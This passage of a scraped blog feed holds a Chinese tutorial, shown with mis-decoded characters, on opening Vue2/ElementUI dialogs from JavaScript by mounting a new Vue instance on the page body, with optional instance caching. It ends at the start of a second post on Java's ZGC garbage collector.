            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1961184474695213/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å¤§å«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T05:59:24.000Z" title="Wed Jan 28 2026 05:59:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯<strong>å‰ç«¯æ¶æ„å¸ˆ</strong>ï¼Œå…³æ³¨å¾®ä¿¡å…¬ä¼—å·ã€@<strong>ç¨‹åºå‘˜å¤§å«</strong>ã€‘å…è´¹é¢†å–å‰ç«¯ç²¾å“èµ„æ–™ã€‚</p>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨è€é¡¹ç›®ï¼ˆVue2 + ElementUIï¼‰é‡Œå†™å¼¹å±‚ï¼Œå¤§å®¶ä¸€å®šå¾ˆç†Ÿæ‚‰ä¸‹é¢è¿™ç§å†™æ³•ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">dialog-test</span>
  <span class="hljs-attr">v-if</span>=<span class="hljs-string">"dialogVisible"</span>
  <span class="hljs-attr">:text</span>=<span class="hljs-string">"text"</span>
  @<span class="hljs-attr">confirm</span>=<span class="hljs-string">"handleConfirm"</span>
  @<span class="hljs-attr">close</span>=<span class="hljs-string">"dialogVisible = false"</span>
/&gt;</span>
</code></pre>
<p>é—®é¢˜æ˜¯ï¼š</p>
<ul>
<li>æ¯ä¸ªé¡µé¢éƒ½è¦å†™ä¸€å † <code>visible</code></li>
<li>å…³é—­å¼¹å±‚è¿˜å¾—æ‰‹åŠ¨é”€æ¯ç»„ä»¶</li>
<li>å¤šä¸ªå¼¹å±‚æ—¶ï¼Œä»£ç åˆè‡­åˆé•¿</li>
<li>åªæ˜¯æƒ³ <strong>â€œç‚¹ä¸ªæŒ‰é’®å¼¹ä¸ªæ¡†â€</strong>ï¼Œå´è¦æ”¹ä¸€å †æ¨¡æ¿</li>
</ul>
<p>æ‰€ä»¥æˆ‘åœ¨è€é¡¹ç›®é‡Œå°è£…äº†ä¸€ä¸ª <strong>å‡½æ•°å¼æ‰“å¼€å¼¹å±‚</strong> çš„æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸ç”¨å†™ templateï¼Œä¸ç”¨å®šä¹‰å˜é‡ dialogVisible</li>
<li>ç›´æ¥ JS è°ƒç”¨</li>
<li>è‡ªåŠ¨åˆ›å»º / é”€æ¯</li>
<li>æ”¯æŒç¼“å­˜ï¼Œä¸é”€æ¯åå¤ç”¨</li>
</ul>
<h2 data-id="heading-1">æœ€ç»ˆæ•ˆæœ</h2>
<p>åƒè¿™æ ·ç›´æ¥è°ƒç”¨å³å¯ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">dialogOpen</span>(
  <span class="hljs-title class_">DialogTest</span>,
  {
    <span class="hljs-attr">text</span>: <span class="hljs-string">"Hello World!"</span>,
    <span class="hljs-attr">onConfirm</span>: <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text);
    },
  },
  { <span class="hljs-attr">context</span>: <span class="hljs-variable language_">this</span> },
);
</code></pre>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<blockquote>
<p><strong>æŠŠâ€œå†™ç»„ä»¶â€è¿™ä»¶äº‹ï¼Œå˜æˆâ€œè°ƒå‡½æ•°â€</strong></p>
</blockquote>
<h2 data-id="heading-2">ä¸€ã€å¼¹å±‚ç»„ä»¶æœ¬èº«ï¼ˆDialogTest.vueï¼‰</h2>
<p>è¿™ä¸ªç»„ä»¶æœ¬èº«éå¸¸æ™®é€šï¼Œæ²¡æœ‰ä»»ä½•é»‘é­”æ³•ã€‚</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;el-dialog title="æç¤º" visible width="30%" @close="doClose" append-to-body&gt;
    &lt;span&gt;{{ text }}&lt;/span&gt;

    &lt;span slot="footer" class="dialog-footer"&gt;
      &lt;el-button type="primary" @click="doCancle"&gt;å–æ¶ˆ&lt;/el-button&gt;
      &lt;el-button type="primary" @click="doConfirm"&gt;ç¡® å®š&lt;/el-button&gt;
    &lt;/span&gt;
  &lt;/el-dialog&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-3">å…³é”®ç‚¹è¯´æ˜</h3>
<ul>
<li><code>visible</code> ç”±å¤–éƒ¨æ§åˆ¶ï¼ˆå‡½æ•°å¼ä¼ å…¥ï¼‰</li>
<li>æ‰€æœ‰è¡Œä¸ºé€šè¿‡ <code>$emit</code> å¾€å¤–æŠ›</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"DialogTest"</span>, <span class="hljs-comment">// âš ï¸ å¿…é¡»æœ‰ nameï¼Œåé¢åšç¼“å­˜ç”¨</span>
  <span class="hljs-attr">props</span>: {
    <span class="hljs-attr">text</span>: <span class="hljs-title class_">String</span>,
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">doClose</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.$emit(<span class="hljs-string">"close"</span>);
    },
    <span class="hljs-title function_">doCancle</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">doClose</span>();
    },
    <span class="hljs-title function_">doConfirm</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.$emit(<span class="hljs-string">"confirm"</span>, <span class="hljs-string">"ç‚¹å‡»ç¡®è®¤æŒ‰é’®"</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">doClose</span>();
    },
  },
};
</code></pre>
<blockquote>
<p><strong>è®°ä½ä¸€å¥è¯ï¼šç»„ä»¶åªè´Ÿè´£å±•ç¤ºå’ŒæŠ›äº‹ä»¶ï¼Œä¸ç®¡æ€ä¹ˆè¢«åˆ›å»ºã€‚</strong></p>
</blockquote>
<h2 data-id="heading-4">äºŒã€æ ¸å¿ƒæ€è·¯ï¼šå‡½æ•°å¼å¼¹å±‚æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿ</h2>
<p>ä¸€å¥è¯æ¦‚æ‹¬å®ç°åŸç†ï¼š</p>
<blockquote>
<p><strong>ç”¨ <code>new Vue()</code> åœ¨ JS é‡ŒåŠ¨æ€åˆ›å»ºç»„ä»¶ï¼Œå¹¶æ‰‹åŠ¨æŒ‚è½½åˆ° body ä¸Š</strong></p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸å†ä¾èµ– templateï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li>JS åˆ›å»º Vue å®ä¾‹</li>
<li>render ä¸€ä¸ª Dialog ç»„ä»¶</li>
<li>æŒ‚è½½åˆ° DOM</li>
<li>å…³é—­æ—¶é”€æ¯æˆ–éšè—</li>
</ol>
<h2 data-id="heading-5">ä¸‰ã€dialogOpen.js æ•´ä½“ç»“æ„è¯´æ˜</h2>
<p>æˆ‘ä»¬å…ˆçœ‹å‡½æ•°ç­¾åï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">dialogOpen</span>(<span class="hljs-title class_">Component</span>, props = {}, options = {})
</code></pre>
<h3 data-id="heading-6">ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ï¼š</h3>





























<table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Component</td><td>å¼¹å±‚ç»„ä»¶</td></tr><tr><td>props</td><td>ä¼ ç»™ç»„ä»¶çš„ props + äº‹ä»¶</td></tr><tr><td>options.context</td><td>å½“å‰é¡µé¢çš„ this</td></tr><tr><td>options.destroyOnClose</td><td>å…³é—­æ˜¯å¦é”€æ¯ï¼ˆé»˜è®¤ trueï¼‰</td></tr><tr><td>options.key</td><td>ç¼“å­˜ key</td></tr></tbody></table>
<h2 data-id="heading-7">å››ã€ä¸ºä»€ä¹ˆå¿…é¡»ä¼  contextï¼Ÿ</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">dialogOpen</span>(<span class="hljs-title class_">DialogTest</span>, {...}, { <span class="hljs-attr">context</span>: <span class="hljs-variable language_">this</span> })
</code></pre>
<p>è¿™æ˜¯å¾ˆå¤šäººç¬¬ä¸€æ¬¡çœ‹ä¸æ‡‚çš„åœ°æ–¹ã€‚</p>
<h3 data-id="heading-8">åŸå› åªæœ‰ä¸€ä¸ªï¼š</h3>
<blockquote>
<p><strong>è®©å¼¹å±‚ç»„ä»¶ç»§æ‰¿å½“å‰é¡µé¢çš„ <code>$router</code>ã€<code>$store</code> ç­‰ä¸Šä¸‹æ–‡</strong></p>
</blockquote>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
  <span class="hljs-attr">parent</span>: context
})
</code></pre>
<p>å¦åˆ™ï¼š</p>
<ul>
<li><code>$router</code> å¯èƒ½æ˜¯ undefined</li>
<li><code>$store</code> ç”¨ä¸äº†</li>
<li>inject / provide å¤±æ•ˆ</li>
</ul>
<h2 data-id="heading-9">äº”ã€props å’Œäº‹ä»¶æ˜¯å¦‚ä½•åŒºåˆ†çš„ï¼Ÿ</h2>
<p>è°ƒç”¨æ—¶æˆ‘ä»¬è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">dialogOpen</span>(<span class="hljs-title class_">DialogTest</span>, {
  <span class="hljs-attr">text</span>: <span class="hljs-string">"Hello World"</span>,
  <span class="hljs-attr">onConfirm</span>: <span class="hljs-function">() =&gt;</span> {},
  <span class="hljs-attr">onClose</span>: <span class="hljs-function">() =&gt;</span> {}
})
</code></pre>
<p>é‚£é—®é¢˜æ¥äº†ï¼š</p>
<ul>
<li>å“ªäº›æ˜¯ propsï¼Ÿ</li>
<li>å“ªäº›æ˜¯äº‹ä»¶ï¼Ÿ</li>
</ul>
<h3 data-id="heading-10">è§£å†³æ–¹æ¡ˆï¼šç»Ÿä¸€çº¦å®š</h3>
<pre><code class="hljs language-js" lang="js">onXxx =&gt; äº‹ä»¶
å…¶å®ƒ =&gt; props
</code></pre>
<p>å¯¹åº”ä»£ç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">splitPropsAndListeners</span> = (<span class="hljs-params">input = {}</span>) =&gt; {
  <span class="hljs-keyword">const</span> props = {};
  <span class="hljs-keyword">const</span> on = {};

  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(input).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/^on[A-Z]/</span>.<span class="hljs-title function_">test</span>(key) &amp;&amp; <span class="hljs-keyword">typeof</span> input[key] === <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">const</span> event = key.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^[A-Z]/</span>, <span class="hljs-function"><span class="hljs-params">s</span> =&gt;</span> s.<span class="hljs-title function_">toLowerCase</span>());
      on[event] = input[key];
    } <span class="hljs-keyword">else</span> {
      props[key] = input[key];
    }
  });

  <span class="hljs-keyword">return</span> { props, on };
};
</code></pre>
<p>æœ€ç»ˆä¼šå˜æˆï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">h</span>(<span class="hljs-title class_">Component</span>, {
  <span class="hljs-attr">props</span>: { text },
  <span class="hljs-attr">on</span>: { confirm, close }
})
</code></pre>
<h2 data-id="heading-11">å…­ã€çœŸæ­£åˆ›å»ºå¼¹å±‚çš„åœ°æ–¹ï¼ˆæ ¸å¿ƒä»£ç ï¼‰</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> wrapperVm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
  <span class="hljs-attr">parent</span>: context,
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">rawProps</span>: initialProps
    };
  },
  <span class="hljs-attr">computed</span>: {
    <span class="hljs-title function_">vnodeData</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> { props, on } = <span class="hljs-title function_">splitPropsAndListeners</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">rawProps</span>);
      <span class="hljs-keyword">return</span> { props, on };
    }
  },
  <span class="hljs-title function_">render</span>(<span class="hljs-params">h</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">Component</span>, {
      <span class="hljs-attr">props</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">vnodeData</span>.<span class="hljs-property">props</span>,
      <span class="hljs-attr">on</span>: {
        ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">vnodeData</span>.<span class="hljs-property">on</span>,
        <span class="hljs-attr">close</span>: <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">vnodeData</span>.<span class="hljs-property">on</span>.<span class="hljs-property">close</span>?.(...args);
          <span class="hljs-title function_">closeHandler</span>();
        }
      }
    });
  }
});
</code></pre>
<h3 data-id="heading-12">è¿™é‡Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</h3>
<ol>
<li><code>rawProps</code> ä¿å­˜æ‰€æœ‰ä¼ å…¥å‚æ•°</li>
<li><code>computed</code> åŠ¨æ€æ‹†åˆ† props / äº‹ä»¶</li>
<li><code>render</code> æ‰‹åŠ¨æ¸²æŸ“ç»„ä»¶</li>
<li>æ‹¦æˆª <code>close</code>ï¼Œç»Ÿä¸€å¤„ç†é”€æ¯é€»è¾‘</li>
</ol>
<h2 data-id="heading-13">ä¸ƒã€å¼¹å±‚æ˜¯æ€ä¹ˆæŒ‚è½½åˆ°é¡µé¢ä¸Šçš„ï¼Ÿ</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(container);
wrapperVm.$mount(container);
</code></pre>
<p>ğŸ‘‰ è¿™ä¸€æ­¥ç›¸å½“äºï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Dialog ç»„ä»¶ --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<h2 data-id="heading-14">å…«ã€å…³é—­æ—¶é”€æ¯ vs ä¸é”€æ¯ï¼ˆç¼“å­˜æœºåˆ¶ï¼‰</h2>
<h3 data-id="heading-15">é»˜è®¤è¡Œä¸ºï¼ˆdestroyOnClose = trueï¼‰</h3>
<pre><code class="hljs language-js" lang="js">wrapperVm.$destroy();
<span class="hljs-title function_">removeElement</span>(wrapperVm.<span class="hljs-property">$el</span>);
</code></pre>
<p><strong>å¥½å¤„ï¼š</strong></p>
<ul>
<li>ä¸å å†…å­˜</li>
<li>æœ€å®‰å…¨</li>
</ul>
<h3 data-id="heading-16">å¼€å¯ç¼“å­˜ï¼ˆdestroyOnClose = falseï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> instanceCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
</code></pre>
<ul>
<li>åŒä¸€ä¸ª key åªåˆ›å»ºä¸€æ¬¡</li>
<li>å…³é—­æ—¶åªæ˜¯ <code>visible = false</code></li>
<li>å†æ¬¡æ‰“å¼€ç›´æ¥å¤ç”¨</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (!destroyOnClose &amp;&amp; instanceCache.<span class="hljs-title function_">has</span>(key)) {
  <span class="hljs-keyword">const</span> cacheWrapperVm = instanceCache.<span class="hljs-title function_">get</span>(key);
  cacheWrapperVm.<span class="hljs-title function_">updateProps</span>(initialProps);
  <span class="hljs-keyword">return</span> cacheWrapperVm.<span class="hljs-property">triggerClose</span>;
}
</code></pre>
<p>é€‚åˆï¼š</p>
<ul>
<li>è¡¨å•å¼¹å±‚</li>
<li>é¢‘ç¹æ‰“å¼€çš„å¼¹çª—</li>
</ul>
<h2 data-id="heading-17">ä¹ã€ä¸ºä»€ä¹ˆè¦ç›‘å¬é¡µé¢é”€æ¯ï¼Ÿ</h2>
<pre><code class="hljs language-js" lang="js">context.$once(<span class="hljs-string">'hook:beforeDestroy'</span>, destroy);
</code></pre>
<p>é˜²æ­¢ï¼š</p>
<ul>
<li>é¡µé¢é”€æ¯äº†</li>
<li>å¼¹å±‚è¿˜ç•™åœ¨ body</li>
<li>é€ æˆå†…å­˜æ³„æ¼</li>
</ul>
<h2 data-id="heading-18">åã€æ€»ç»“</h2>
<p>è¿™ä¸ªæ–¹æ¡ˆé€‚åˆï¼š</p>
<ul>
<li>Vue2 è€é¡¹ç›®</li>
<li>ElementUI å¼¹å±‚</li>
<li>ä¸æƒ³æ¯ä¸ªé¡µé¢éƒ½å†™ dialog</li>
</ul>
<h2 data-id="heading-19">é™„æºç </h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzm8%2Fwechat-oa%2Ftree%2Fmain%2Fexamples%2Fvue2-dialogOpen" target="_blank" title="https://github.com/zm8/wechat-oa/tree/main/examples/vue2-dialogOpen" ref="nofollow noopener noreferrer">github.com/zm8/wechat-â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GCæ€§èƒ½ä¹‹ç‹ï¼šZGCï¼ˆå«åˆ†ä»£ZGCè§£é‡Šï¼‰]]></title>    <link>https://juejin.cn/post/7600229327436218418</link>    <guid>https://juejin.cn/post/7600229327436218418</guid>    <pubDate>2026-01-28T10:49:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600229327436218418" data-draft-id="7600234310964887590" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GCæ€§èƒ½ä¹‹ç‹ï¼šZGCï¼ˆå«åˆ†ä»£ZGCè§£é‡Šï¼‰"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-28T10:49:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lystran"/> <meta itemprop="url" content="https://juejin.cn/user/2052152412356427"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GCæ€§èƒ½ä¹‹ç‹ï¼šZGCï¼ˆå«åˆ†ä»£ZGCè§£é‡Šï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2052152412356427/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lystran
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T10:49:35.000Z" title="Wed Jan 28 2026 10:49:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»25åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul 